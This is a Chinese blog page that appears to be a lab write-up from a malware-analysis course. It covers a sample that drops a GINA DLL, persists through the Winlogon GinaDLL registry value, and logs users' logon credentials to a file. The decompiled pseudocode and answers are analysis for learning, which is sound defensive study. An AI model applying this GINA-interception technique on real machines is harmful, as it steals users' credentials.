@@ -1,0 +1,915 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Lab11-01简要分析程序的主要流程如下： 12345678910111213141516171819202122int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  HMODULE hModule; &#x2F;&#x2F; [esp+Ch] [ebp-11Ch]  CHAR Filename; &#x2F;&#x2F; [esp+10h] [">
+<meta property="og:type" content="article">
+<meta property="og:title" content="恶意代码分析实战 Lab11">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;06&#x2F;07&#x2F;lab11&#x2F;index.html">
+<meta property="og:site_name" content="Ivoripuion&#39;s blog">
+<meta property="og:description" content="Lab11-01简要分析程序的主要流程如下： 12345678910111213141516171819202122int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  HMODULE hModule; &#x2F;&#x2F; [esp+Ch] [ebp-11Ch]  CHAR Filename; &#x2F;&#x2F; [esp+10h] [">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;06&#x2F;07&#x2F;lab11&#x2F;dbg1.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;06&#x2F;07&#x2F;lab11&#x2F;dbg2.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;06&#x2F;07&#x2F;lab11&#x2F;dbg3.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;06&#x2F;07&#x2F;lab11&#x2F;dbg4.JPG">
+<meta property="og:updated_time" content="2020-06-07T12:15:59.257Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;06&#x2F;07&#x2F;lab11&#x2F;dbg1.JPG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/06/07/lab11/"/>
+
+
+
+
+
+  <title>恶意代码分析实战 Lab11 | Ivoripuion's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ivoripuion's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-pwn">
+          <a href="/categories/pwn" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            pwn
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reverse">
+          <a href="/categories/reverse" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            reverse
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-随想">
+          <a href="/categories/%E9%9A%8F%E6%83%B3" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            随想
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/07/lab11/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ivoripuion">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ivoripuion's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">恶意代码分析实战 Lab11</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-06-07T20:13:52+08:00">
+                2020-06-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/reverse/" itemprop="url" rel="index">
+                    <span itemprop="name">reverse</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Lab11-01"><a href="#Lab11-01" class="headerlink" title="Lab11-01"></a>Lab11-01</h1><h2 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h2><p>程序的主要流程如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HMODULE hModule; <span class="comment">// [esp+Ch] [ebp-11Ch]</span></span><br><span class="line">  CHAR Filename; <span class="comment">// [esp+10h] [ebp-118h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+11h] [ebp-117h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [esp+11Dh] [ebp-Bh]</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// [esp+120h] [ebp-8h]</span></span><br><span class="line">  LPVOID v9; <span class="comment">// [esp+124h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  hModule = GetModuleHandleA(<span class="number">0</span>);</span><br><span class="line">  Filename = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6, <span class="number">0</span>, <span class="number">0x10C</span>u);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v9 = get_dll_401080(hModule);                 <span class="comment">// //加载dll</span></span><br><span class="line">  GetModuleFileNameA(<span class="number">0</span>, &amp;Filename, <span class="number">0x10E</span>u);</span><br><span class="line">  v8 = <span class="built_in">strrchr</span>(&amp;Filename, <span class="number">92</span>);</span><br><span class="line">  *v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcat</span>(&amp;Filename, aMsgina32Dll_0);</span><br><span class="line">  set_reg_401000(&amp;Filename, <span class="number">0x104</span>u);            <span class="comment">// 设置注册表</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>get_dll_401080</code>函数提取TGAD资源节的内容，然后复制为msgina32.dll：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">LPVOID __<span class="function">cdecl <span class="title">sub_401080</span><span class="params">(HMODULE hModule)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v2; <span class="comment">// ST2C_4</span></span><br><span class="line">  HGLOBAL hResData; <span class="comment">// [esp+8h] [ebp-18h]</span></span><br><span class="line">  HRSRC hResInfo; <span class="comment">// [esp+Ch] [ebp-14h]</span></span><br><span class="line">  DWORD dwSize; <span class="comment">// [esp+10h] [ebp-10h]</span></span><br><span class="line">  LPVOID v6; <span class="comment">// [esp+14h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v7; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !hModule )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  hResInfo = FindResourceA(hModule, lpName, lpType);<span class="comment">// .data:00408030 lpType          dd offset aBinary       ; DATA XREF: get_dll_401080:loc_4010B8↑r</span></span><br><span class="line">                                                <span class="comment">// .data:00408030                                         ; "BINARY"</span></span><br><span class="line">                                                <span class="comment">// .data:00408034 ; LPCSTR lpName</span></span><br><span class="line">                                                <span class="comment">// .data:00408034 lpName          dd offset aTgad         ; DATA XREF: get_dll_401080+3E↑r</span></span><br><span class="line">                                                <span class="comment">// .data:00408034                                         ; "TGAD"</span></span><br><span class="line">                                                <span class="comment">// .data:00408038 aTgad           db 'TGAD',0             ; DATA XREF: .data:lpName↑o</span></span><br><span class="line">                                                <span class="comment">// .data:0040803D                 align 10h</span></span><br><span class="line">                                                <span class="comment">// .data:00408040 aBinary         db 'BINARY',0           ; DATA XREF: .data:lpType↑o</span></span><br><span class="line">                                                <span class="comment">// .data:00408047                 align 4</span></span><br><span class="line">                                                <span class="comment">// .data:00408048 aRi             db 'RI',0Ah,0      </span></span><br><span class="line">  <span class="keyword">if</span> ( !hResInfo )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  hResData = LoadResource(hModule, hResInfo);</span><br><span class="line">  <span class="keyword">if</span> ( hResData )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = LockResource(hResData);</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      dwSize = SizeofResource(hModule, hResInfo);</span><br><span class="line">      <span class="keyword">if</span> ( dwSize )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = VirtualAlloc(<span class="number">0</span>, dwSize, <span class="number">0x1000</span>u, <span class="number">4u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v6 )</span><br><span class="line">        &#123;</span><br><span class="line">          qmemcpy(v6, v7, dwSize);</span><br><span class="line">          v2 = fopen(aMsgina32Dll, aWb);</span><br><span class="line">          fwrite(v7, <span class="number">1u</span>, dwSize, v2);</span><br><span class="line">          fclose(v2);</span><br><span class="line">          print_401299(aDr);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( hResInfo )</span><br><span class="line">    FreeResource(hResInfo);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>set_reg_401000</code>函数将msgina32.dll插入到SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GinaDLL中，当系统重启Winlogon将加载msgina32.dll，可以怀疑该恶意代码使用GINA拦截技术来窃取用户凭证：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401000</span><span class="params">(BYTE *lpData, DWORD cbData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HKEY v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  HKEY phkResult; <span class="comment">// [esp+0h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  phkResult = v2;</span><br><span class="line">  <span class="keyword">if</span> ( RegCreateKeyExA(HKEY_LOCAL_MACHINE, SubKey, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0xF003F</span>u, <span class="number">0</span>, &amp;phkResult, <span class="number">0</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( RegSetValueExA(phkResult, ValueName, <span class="number">0</span>, <span class="number">1u</span>, lpData, cbData) )</span><br><span class="line">  &#123;</span><br><span class="line">    CloseHandle(phkResult);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    print_401299(aRi);</span><br><span class="line">    CloseHandle(phkResult);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>msgina32.dll的<code>DLLMain</code>：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">BOOL __<span class="function">stdcall <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  BOOL result; <span class="comment">// eax</span></span><br><span class="line">  WCHAR Buffer; <span class="comment">// [esp+0h] [ebp-208h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( fdwReason == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    DisableThreadLibraryCalls(hinstDLL);</span><br><span class="line">    hModule = hinstDLL;</span><br><span class="line">    GetSystemDirectoryW(&amp;Buffer, <span class="number">0x104</span>u);</span><br><span class="line">    lstrcatW(&amp;Buffer, <span class="string">L"\\MSGina"</span>);</span><br><span class="line">    hLibModule = LoadLibraryW(&amp;Buffer);</span><br><span class="line">    result = hLibModule != <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !fdwReason )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( hLibModule )</span><br><span class="line">        FreeLibrary(hLibModule);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先检查<code>fdwReason</code>是否为1，若为1则将系统中的msgina.dll的句柄，以此进行GINA拦截。</p>
+<p>dll中其他的一些导出函数结构如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">WlxInitialize</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> (*v0)(<span class="keyword">void</span>); <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = sub_10001000(aWlxinitialize_0);</span><br><span class="line">  <span class="keyword">return</span> v0();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">WlxIsLogoffOk</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> (*v0)(<span class="keyword">void</span>); <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = sub_10001000(aWlxislogoffok_0);</span><br><span class="line">  <span class="keyword">return</span> v0();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">WlxNetworkProviderLoad</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> (*v0)(<span class="keyword">void</span>); <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = sub_10001000(aWlxnetworkprov_0);</span><br><span class="line">  <span class="keyword">return</span> v0();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>sub_10001000</code>函数用于寻址：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">FARPROC __<span class="function">stdcall <span class="title">sub_10001000</span><span class="params">(LPCSTR lpProcName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FARPROC result; <span class="comment">// eax</span></span><br><span class="line">  CHAR v2; <span class="comment">// [esp+4h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  result = GetProcAddress(hLibModule, lpProcName);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(lpProcName &gt;&gt; <span class="number">16</span>) )</span><br><span class="line">      wsprintfA(&amp;v2, aD, lpProcName);</span><br><span class="line">    ExitProcess(<span class="number">0xFFFFFFFE</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>基本都是首先劫持正确的函数，然后使用<code>sub_10001000</code>函数跳转到正确的函数去调用来保证劫持msgina.dll后系统正常运行。</p>
+<p>这里的<code>WlxLoggedOutSAS</code>函数有其他的调用：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">WlxLoggedOutSAS</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">int</span> a6, _DWORD *a7, <span class="keyword">int</span> a8)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FARPROC v8; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// edi</span></span><br><span class="line"></span><br><span class="line">  v8 = sub_10001000(aWlxloggedoutsa_0);</span><br><span class="line">  <span class="function"><span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="number">0x64</span>u)</span></span>;</span><br><span class="line">  v9 = (v8)(a1, a2, a3, a4, a5, a6, a7, a8);</span><br><span class="line">  <span class="keyword">if</span> ( v9 == <span class="number">1</span> &amp;&amp; *a7 )</span><br><span class="line">    sub_10001570(<span class="number">0</span>, aUnSDmSPwSOldS, *a7, a7[<span class="number">1</span>], a7[<span class="number">2</span>], a7[<span class="number">3</span>]);</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>sub_10001570</code>函数使用传入<code>WlxLoggedOutSAS</code>的PWLX_MPR_NOTIFY_INFO作为参数，登陆的凭据以及时间日期写入到msutil32.sys文件：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">va_start(va, Format);</span><br><span class="line">vsnwprintf(&amp;Dest, <span class="number">0x800</span>u, Format, va);</span><br><span class="line">result = wfopen(Filename, &amp;Mode);             <span class="comment">// .data:100032F8                 text "UTF-16LE", 'msutil32.sys',0</span></span><br><span class="line">file_handle = result;</span><br><span class="line"><span class="keyword">if</span> ( result )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = wstrtime(&amp;Buffer);</span><br><span class="line">  v5 = wstrdate(&amp;v8);</span><br><span class="line">  fwprintf(file_handle, ::Format, v5, v4, &amp;Dest);</span><br><span class="line">  <span class="keyword">if</span> ( dwMessageId )</span><br><span class="line">  &#123;</span><br><span class="line">    FormatMessageW(<span class="number">0x1100</span>u, <span class="number">0</span>, dwMessageId, <span class="number">0x409</span>u, v6, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    fwprintf(file_handle, aErrorcodeDErro, dwMessageId, *v6);<span class="comment">// .data:100032A0                 text "UTF-16LE", 'ErrorCode:%d ErrorMessage:%s. ',0Ah,0</span></span><br><span class="line">    LocalFree(*v6);</span><br><span class="line">    result = fclose(file_handle);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    fwprintf(file_handle, asc_1000329C);</span><br><span class="line">    result = fclose(file_handle);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Q1：这个恶意代码向磁盘释放了什么？"><a href="#Q1：这个恶意代码向磁盘释放了什么？" class="headerlink" title="Q1：这个恶意代码向磁盘释放了什么？"></a>Q1：这个恶意代码向磁盘释放了什么？</h2><p>恶意代码从TGAD的资源节提取一个文件并命名为msgina32.dll，然后写入到系统中。</p>
+<h2 id="Q2：这个恶意代码如何进行驻留？"><a href="#Q2：这个恶意代码如何进行驻留？" class="headerlink" title="Q2：这个恶意代码如何进行驻留？"></a>Q2：这个恶意代码如何进行驻留？</h2><p>设置一个注册表的值：SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GinaDLL来保证每次开机都会加载dll。</p>
+<h2 id="Q3：这个恶意代码如何窃取用户登录凭证？"><a href="#Q3：这个恶意代码如何窃取用户登录凭证？" class="headerlink" title="Q3：这个恶意代码如何窃取用户登录凭证？"></a>Q3：这个恶意代码如何窃取用户登录凭证？</h2><p>使用了GINA拦截技术，将msgina.dll劫持为msgina32.dll，当系统调用<code>WlxLoggedOutSAS</code>函数时，msgina32.dll在调用正常的<code>WlxLoggedOutSAS</code>后将用户凭证以及时间信息写入到C:\WINDOWS\system32\msutil32.sys中。</p>
+<p><img src="/2020/06/07/lab11/dbg1.JPG" alt></p>
+<p><img src="/2020/06/07/lab11/dbg2.JPG" alt></p>
+<h2 id="Q4：这个恶意代码对窃取的凭证做了什么处理？"><a href="#Q4：这个恶意代码对窃取的凭证做了什么处理？" class="headerlink" title="Q4：这个恶意代码对窃取的凭证做了什么处理？"></a>Q4：这个恶意代码对窃取的凭证做了什么处理？</h2><p>将用户凭证以及时间信息写入到C:\WINDOWS\system32\msutil32.sys中。</p>
+<h2 id="Q5：如何在你的测试环境让这个恶意代码获得用户登录凭证？"><a href="#Q5：如何在你的测试环境让这个恶意代码获得用户登录凭证？" class="headerlink" title="Q5：如何在你的测试环境让这个恶意代码获得用户登录凭证？"></a>Q5：如何在你的测试环境让这个恶意代码获得用户登录凭证？</h2><p>运行恶意代码程序后重启，只要系统使用了WinLogon登录管理就会记录凭证。</p>
